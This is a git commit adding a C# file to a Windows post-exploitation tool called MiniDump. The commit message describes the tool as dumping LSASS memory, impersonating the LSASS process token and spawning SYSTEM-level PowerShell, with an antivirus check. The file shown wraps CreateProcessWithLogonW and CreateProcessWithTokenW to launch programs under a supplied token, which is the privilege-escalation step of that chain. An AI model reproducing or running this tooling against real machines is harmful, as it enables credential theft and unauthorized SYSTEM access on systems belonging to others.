ab3d35cefe53505a2774e573d37e511803b26789
mirageXY <75732010+mirageXY@users.noreply.github.com>
2020-12-09 19:57:47 +0800

    Add files via upload
    MiniDump lsass to dmp file + token impersonation of the lsass PID 836 + system privilege access to poweshell via impersonating PID 836 + check if AV product is present on the PC

---
+++ MiniDump/MiniDump/CreateProcess.cs
@@ -0,0 +1,129 @@
+﻿using System;
+using System.Runtime.InteropServices;
+using System.Text;
+
+using MonkeyWorks.Unmanaged.Headers;
+using MonkeyWorks.Unmanaged.Libraries;
+
+
+namespace MiniDump
+{
+    class CreateProcess
+    {
+        private static void GetWin32Error(String location)
+        {
+            Console.WriteLine(" [-] Function {0} failed: ", location);
+            Console.WriteLine(" [-] {0}", new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
+        }
+        ////////////////////////////////////////////////////////////////////////////////
+        // Wrapper for ProcessWithLogonW
+        ////////////////////////////////////////////////////////////////////////////////
+        public static Boolean CreateProcessWithLogonW(IntPtr phNewToken, String name, String arguments)
+        {
+            if (name.Contains("\\"))
+            {
+                name = System.IO.Path.GetFullPath(name);
+                if (!System.IO.File.Exists(name))
+                {
+                    Console.WriteLine("[-] File Not Found");
+                    return false;
+                }
+            }
+            else
+            {
+                name = FindFilePath(name);
+                if (String.Empty == name)
+                {
+                    Console.WriteLine("[-] Unable to find file");
+                    return false;
+                }
+            }
+
+            Console.WriteLine("[*] CreateProcessWithLogonW");
+            Winbase._STARTUPINFO startupInfo = new Winbase._STARTUPINFO();
+            startupInfo.cb = (UInt32)Marshal.SizeOf(typeof(Winbase._STARTUPINFO));
+            Winbase._PROCESS_INFORMATION processInformation = new Winbase._PROCESS_INFORMATION();
+            if (!advapi32.CreateProcessWithLogonW("i", "j", "k",
+                Winbase.LOGON_FLAGS.LOGON_NETCREDENTIALS_ONLY,
+                name,
+                name,
+                Winbase.CREATION_FLAGS.CREATE_DEFAULT_ERROR_MODE,
+                IntPtr.Zero,
+                Environment.CurrentDirectory,
+                ref startupInfo,
+                out processInformation
+            ))
+            {
+                GetWin32Error("CreateProcessWithLogonW");
+                return false;
+            }
+
+            Console.WriteLine(" [+] Created process: " + processInformation.dwProcessId);
+            Console.WriteLine(" [+] Created thread: " + processInformation.dwThreadId);
+            return true;
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        // Wrapper for CreateProcessWithTokenW
+        ////////////////////////////////////////////////////////////////////////////////
+        public static Boolean CreateProcessWithTokenW(IntPtr phNewToken, String name, String arguments)
+        {
+            if (name.Contains(@"\"))
+            {
+                name = System.IO.Path.GetFullPath(name);
+                if (!System.IO.File.Exists(name))
+                {
+                    Console.WriteLine("[-] File Not Found");
+                    return false;
+                }
+            }
+            else
+            {
+                name = FindFilePath(name);
+                if (String.Empty == name)
+                {
+                    Console.WriteLine("[-] Unable to find file");
+                    return false;
+                }
+            }
+
+            Console.WriteLine("[*] CreateProcessWithTokenW");
+            Winbase._STARTUPINFO startupInfo = new Winbase._STARTUPINFO
+            {
+                cb = (UInt32)Marshal.SizeOf(typeof(Winbase._STARTUPINFO))
+            };
+            Winbase._PROCESS_INFORMATION processInformation = new Winbase._PROCESS_INFORMATION();
+            if (!advapi32.CreateProcessWithTokenW(
+                phNewToken,
+                Winbase.LOGON_FLAGS.LOGON_NETCREDENTIALS_ONLY,
+                name,
+                name + " " + arguments,
+                Winbase.CREATION_FLAGS.NONE,
+                IntPtr.Zero,
+                Environment.CurrentDirectory,
+                ref startupInfo,
+                out processInformation
+            ))
+            {
+                GetWin32Error("CreateProcessWithTokenW");
+                return false;
+            }
+            Console.WriteLine(" [+] Created process: " + processInformation.dwProcessId);
+            Console.WriteLine(" [+] Created thread: " + processInformation.dwThreadId);
+            return true;
+        }
+
+        public static String FindFilePath(String name)
+        {
+            StringBuilder lpFileName = new StringBuilder(260);
+            IntPtr lpFilePart = new IntPtr();
+            UInt32 result = kernel32.SearchPath(null, name, null, (UInt32)lpFileName.Capacity, lpFileName, ref lpFilePart);
+            if (String.Empty == lpFileName.ToString())
+            {
+                Console.WriteLine(new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
+                return String.Empty;
+            }
+            return lpFileName.ToString();
+        }
+    }
+}
